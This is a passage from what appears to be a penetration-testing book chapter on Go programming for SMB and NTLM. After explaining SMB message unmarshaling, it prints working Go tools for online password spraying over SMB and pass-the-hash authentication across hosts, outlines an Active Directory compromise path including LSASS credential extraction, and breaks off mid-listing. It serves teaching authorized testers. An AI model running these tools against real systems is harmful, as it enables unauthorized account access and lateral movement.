Next, we use a switch statement to act specifically on the field type y. 
There are only two cases. The first handles instances where the field itself 
is a struct z, in which case, we make a recursive call to the unmarshal() 
function, passing to it a pointer to the field as an interface. The second case 
handles all other kinds (primitives, slices, and so on), recursively calling the 
unmarshal() function and passing it the field itself as an interface {. Both 
calls do some funny business to advance the buffer to start at our current 
offset. Our recursive call eventually returns an interface{}, which is a type 
that contains our unmarshaled data. We use reflection to set our current 
field’s value to the value of this interface data |. Lastly, we advance our 
current offset in the buffer }.
Yikes! Can you see how this can be a challenge to develop? We have a 
separate case for every kind of input. Luckily, the case block that handles 
a struct is the most complicated. 
Handling uint16
If you are really paying attention, you’re probably asking: where do you 
actually read data from the buffer? The answer is nowhere in Listing 6-9. 
Recall that we are making recursive calls to the unmarshal() function, and 
each time, we pass the inner fields to the function. Eventually we’ll reach 
primitive data types. After all, at some point, the innermost nested structs 
are composed of basic data types. When we encounter a basic data type, 
our code will match against a different case in the outermost switch state-
ment. For example, when we encounter a uint16 data type, this code exe-
cutes the case block in Listing 6-10.
前沿信安资讯阵地  公众号：i nf osrc
144   Chapter 6
case reflect.Uint16:
    var ret uint16
    if err := binary.Read(r, binary.LittleEndian, &ret)u; err != nil {
        return nil, err
    }
    if meta.Tags.Has("len")v {
        ref, err := meta.Tags.GetString("len")w
        if err != nil {
            return nil, err
        }
        meta.Lens[ref]x = uint64(ret)
    }
    y meta.CurrOffset += uint64(binary.Size(ret))
    return ret, nil
Listing 6-10: Unmarshaling uint16 data (/ch-6/smb/smb/encoder /encoder.go/)
In this case block, we make a call to binary.Read() in order to read data 
from our buffer into a variable, ret u. This function is smart enough to 
know how many bytes to read, based off the type of the destination. In this 
case, ret is a uint16, so 2 bytes are read. 
Next, we check whether the len field tag is present v. If it is, we retrieve 
the value—that is, a field name—tied to that key w. Recall that this value 
will be a field name to which the current field is expected to refer. Because 
the length-identifying fields precede the actual data in the SMB messages, 
we don’t know where the buffer data actually resides, and so we can’t take 
any action yet.
We’ve just acquired length metadata, and there’s no better place to 
store it than in our Metadata object. We store it within a map[string]uint64 
that maintains a relationship of reference field names to their lengths x. 
Phrased another way, we now know how long a variable-length byte slice 
needs to be. We advance the current offset by the size of the data we just 
read y, and return the value read from the buffer.
Similar logic and metadata tracking happen in the process of handling 
the offset tag information, but we omitted that code for brevity.
Handling Slices
In Listing 6-11, you can see the case block that unmarshals slices, which we 
need to account for both fixed- and variable-length data while using tags 
and metadata in the process.
case reflect.Slice, reflect.Array:
    switch typev.Elem().Kind()u {
    case reflect.Uint8:
        var length, offset int v
        var err error
        if meta.Tags.Has("fixed") {
            if length, err = meta.Tags.GetInt("fixed")w; err != nil {
                return nil, err
            }
前沿信安资讯阵地  公众号：i nf osrc
Interacting with SMB and NTLM    145
            // Fixed length fields advance current offset
            meta.CurrOffset += uint64(length) x
        } else {
            if val, ok := meta.Lens[meta.CurrField]y; ok {
                length = int(val)
            } else {
                return nil, errors.New("Variable length field missing length reference in struct")
            }
            if val, ok := meta.Offsets[meta.CurrField]z; ok {
                offset = int(val)
            } else {
                // No offset found in map. Use current offset
                offset = int(meta.CurrOffset)
            }
            // Variable length data is relative to parent/outer struct. 
            // Reset reader to point to beginning of data
            r = bytes.NewBuffer(meta.ParentBuf[offset : offset+length])
            // Variable length data fields do NOT advance current offset.
        }
        data := make([]byte, length) {
        if err := binary.Read(r, binary.LittleEndian, &data)|; err != nil {
            return nil, err
        }
        return data, nil
Listing 6-11: Unmarshaling fixed- and variable-length byte slices (/ch-6/smb/smb /encoder/encoder.go/)
First, we use reflection to determine the slice’s element type u. For 
example, handling of []uint8 is different from []uint32, as the number of 
bytes per element differs. In this case, we’re handling only []uint8 slices. 
Next, we define a couple of local variables, length and offset, to use for 
tracking the length of the data to read and the offset within the buffer 
from which to begin reading v. If the slice is defined with the fixed tag, 
we retrieve the value and assign it to length w. Recall that the tag value 
for the fixed key is an integer that defines the length of the slice. We’ll 
use this length to advance the current buffer offset for future reads x. For 
fixed-length fields, the offset is left as its default value—zero—since it will 
always appear at the current offset. Variable-length slices are slightly more 
complex because we retrieve both the length y and offset z information 
from our Metadata structure. A field uses its own name as the key for the 
lookup of the data. Recall how we populated this information previously. 
With our length and offset variables properly set, we then create a slice of the 
desired length { and use it in a call to binary.Read() |. Again, this function is 
smart enough to read bytes up until our destination slice has been filled.
This has been an exhaustingly detailed journey into the dark recesses of 
custom tags, reflection, and encoding with a hint of SMB. Let’s move beyond 
this ugliness and do something useful with the SMB library. Thankfully, the 
following use cases should be significantly less complicated.
前沿信安资讯阵地  公众号：i nf osrc
146   Chapter 6
Guessing Passwords with SMB
The first SMB case we’ll examine is a fairly common one for attackers and 
pen testers: online password guessing over SMB. You’ll try to authenti-
cate to a domain by providing commonly used usernames and passwords. 
Before diving in, you’ll need to grab the SMB package with the following 
get command:
$ go get github.com/bhg/ch-6/smb 
Once the package is installed, let’s get to coding. The code you’ll create 
(shown in Listing 6-12) accepts a file of newline-separated usernames, a 
password, a domain, and target host information as command line argu-
ments. To avoid locking accounts out of certain domains, you’ll attempt a 
single password across a list of users rather than attempt a list of passwords 
across one or more users.
W A R N I N G 
Online password guessing can lock accounts out of a domain, effectively resulting in 
a denial-of-service attack. Take caution when testing your code and run this against 
only systems on which you’re authorized to test.
func main() {
    if len(os.Args) != 5 {
        log.Fatalln("Usage: main     
        ")
    }
    buf, err := ioutil.ReadFile(os.Args[1])
    if err != nil {
        log.Fatalln(err)
    }
    options := smb.Optionsu{
        Password: os.Args[2],
        Domain:   os.Args[3],
        Host:     os.Args[4],
        Port:     445,
    }
    users := bytes.Split(buf, []byte{'\n'})
    for _, user := range usersv {
        w options.User = string(user)
        session, err := smb.NewSession(options, false)x
        if err != nil {
            fmt.Printf("[-] Login failed: %s\\%s [%s]\n",
                options.Domain,
                options.User,
                options.Password)
            continue
        }
前沿信安资讯阵地  公众号：i nf osrc
Interacting with SMB and NTLM    147
        defer session.Close()
        if session.IsAuthenticatedy {
            fmt.Printf("[+] Success     : %s\\%s [%s]\n",
                options.Domain,
                options.User,
                options.Password)
        }
    }
}
Listing 6-12: Leveraging the SMB package for online password guessing (/ch-6/password 
-guessing/main.go)
The SMB package operates on sessions. To establish a session, you first 
initialize an smb.Options instance that will contain all your session options, 
including target host, user, password, port, and domain u. Next, you loop 
through each of your target users v, setting the options.User value appro-
priately w, and issue a call to smb.NewSession() x. This function does a lot of 
heavy lifting for you behind the scenes: it negotiates both the SMB dialect 
and authentication mechanism, and then authenticates to the remote tar-
get. The function will return an error if authentication fails, and a boolean 
IsAuthenticated field on the session struct is populated based off the out-
come. It will then check the value to see whether the authentication suc-
ceeded, and if it did, display a success message y. 
That is all it takes to create an online password-guessing utility.
Reusing Passwords with the Pass-the-Hash Technique
The pass-the-hash technique allows an attacker to perform SMB authentica-
tion by using a password’s NTLM hash, even if the attacker doesn’t have the 
cleartext password. This section walks you through the concept and shows 
you an implementation of it. 
Pass-the-hash is a shortcut to a typical Active Directory domain compromise, 
a type of attack in which attackers gain an initial foothold, elevate their 
privileges, and move laterally throughout the network until they have 
the access levels they need to achieve their end goal. Active Directory 
domain compromises generally follow the roadmap presented in this list, 
assuming they take place through an exploit rather than something like 
password guessing:
1. The attacker exploits the vulnerability and gains a foothold on 
the network.
2. The attacker elevates privileges on the compromised system.
3. The attacker extracts hashed or cleartext credentials from LSASS.
4. The attacker attempts to recover the local administrator password 
via offline cracking.
前沿信安资讯阵地  公众号：i nf osrc
148   Chapter 6
5. The attacker attempts to authenticate to other machines by using the 
administrator credentials, looking for reuse of the password.
6. The attacker rinses and repeats until the domain administrator or 
other target has been compromised.
With NTLMSSP authentication, however, even if you fail to recover 
the cleartext password during step 3 or 4, you can proceed to use the pass-
word’s NTLM hash for SMB authentication during step 5—in other words, 
passing the hash. 
Pass-the-hash works because it separates the hash calculation from the 
challenge-response token calculation. To see why this is, let’s look at the fol-
lowing two functions, defined by the NTLMSSP specification, pertaining to 
the cryptographic and security mechanisms used for authentication:
NTOWFv2 A cryptographic function that creates an MD5 HMAC 
by using the username, domain, and password values. It generates the 
NTLM hash value.
ComputeResponse A function that uses the NTLM hash in combina-
tion with the message’s client and server challenges, timestamp, and 
target server name to produce a GSS-API security token that can be 
sent for authentication. 
You can see the implementations of these functions in Listing 6-13.
func Ntowfv2(pass, user, domain string) []byte {
    h := hmac.New(md5.New, Ntowfv1(pass))
    h.Write(encoder.ToUnicode(strings.ToUpper(user) + domain))
    return h.Sum(nil)
}
func ComputeResponseNTLMv2(nthashu, lmhash, clientChallenge, serverChallenge, timestamp,
                           serverName []byte) []byte {
    temp := []byte{1, 1}
    temp = append(temp, 0, 0, 0, 0, 0, 0)
    temp = append(temp, timestamp...)
    temp = append(temp, clientChallenge...)
    temp = append(temp, 0, 0, 0, 0)
    temp = append(temp, serverName...)
    temp = append(temp, 0, 0, 0, 0)
    h := hmac.New(md5.New, nthash)
    h.Write(append(serverChallenge, temp...))
    ntproof := h.Sum(nil)
    return append(ntproof, temp...)
}
Listing 6-13: Working with NTLM hashes (/ch-6/smb/ntlmssp/crypto.go)
The NTLM hash is supplied as input to the ComputeResponseNTLMv2 
function u, meaning the hash has been created independently of the 
logic used for security token creation. This implies that hashes stored 
前沿信安资讯阵地  公众号：i nf osrc
Interacting with SMB and NTLM    149
anywhere—even in LSASS—are considered precalculated, because you 
don’t need to supply the domain, user, or password as input. The authenti-
cation process is as follows:
1. 
Calculate the user’s hash by using the domain, user, and password values.
2. Use the hash as input to calculate authentication tokens for NTLMSSP 
over SMB.
Since you already have a hash in hand, you’ve already completed 
step 1. To pass the hash, you initiate your SMB authentication sequence, 
as you defined it way back in the opening sections of this chapter. However, 
you never calculate the hash. Instead, you use the supplied value as the 
hash itself. 
Listing 6-14 shows a pass-the-hash utility that uses a password hash to 
attempt to authenticate as a specific user to a list of machines.
func main() {
    if len(os.Args) != 5 {
        log.Fatalln("Usage: main    ")
    }
    buf, err := ioutil.ReadFile(os.Args[1])
    if err != nil {
        log.Fatalln(err)
    }
    options := smb.Options{
        User:   os.Args[2],
        Domain: os.Args[3],
        Hashu: os.Args[4],
        Port:   445,
    }
    targets := bytes.Split(buf, []byte{'\n'})
    for _, target := range targetsv {
        options.Host = string(target)
        session, err := smb.NewSession(options, false)
        if err != nil {
            fmt.Printf("[-] Login failed [%s]: %s\n", options.Host, err)
            continue
        }
        defer session.Close()
        if session.IsAuthenticated {
            fmt.Printf("[+] Login successful [%s]\n", options.Host)
        }
    }
}
Listing 6-14: Passing the hash for authentication testing (/ch-6 /password-reuse/main.go)
前沿信安资讯阵地  公众号：i nf osrc
150   Chapter 6
This code should look similar to the password-guessing example. The 
only significant differences are that you’re setting the Hash field of smb.Options 
(not the Password field) u and you’re iterating over a list of target hosts 
(rather than target users) v. The logic within the smb.NewSession() function 
will use the hash value if populated within the options struct.
Recovering NTLM Passwords
In some instances, having only the password hash will be inadequate for 
your overall attack chain. For example, many services (such as Remote 
Desktop, Outlook Web Access, and others) don’t allow hash-based authen-
tication, because it either isn’t supported or isn’t a default configuration. 
If your attack chain requires access to one of these services, you’ll need 
a cleartext password. In the following sections, you’ll walk through how 
hashes are calculated and how to create a basic password cracker.
Calculating the Hash
In Listing 6-15, you perform the magic of calculating the hash.
func NewAuthenticatePass(domain, user, workstation, password string, c Challenge) Authenticate 
{
    // Assumes domain, user, and workstation are not unicode
    nthash := Ntowfv2(password, user, domain)
    lmhash := Lmowfv2(password, user, domain)
    return newAuthenticate(domain, user, workstation, nthash, lmhash, c)
}
func NewAuthenticateHash(domain, user, workstation, hash string, c Challenge) Authenticate {
    // Assumes domain, user, and workstation are not unicode
    buf := make([]byte, len(hash)/2)
    hex.Decode(buf, []byte(hash))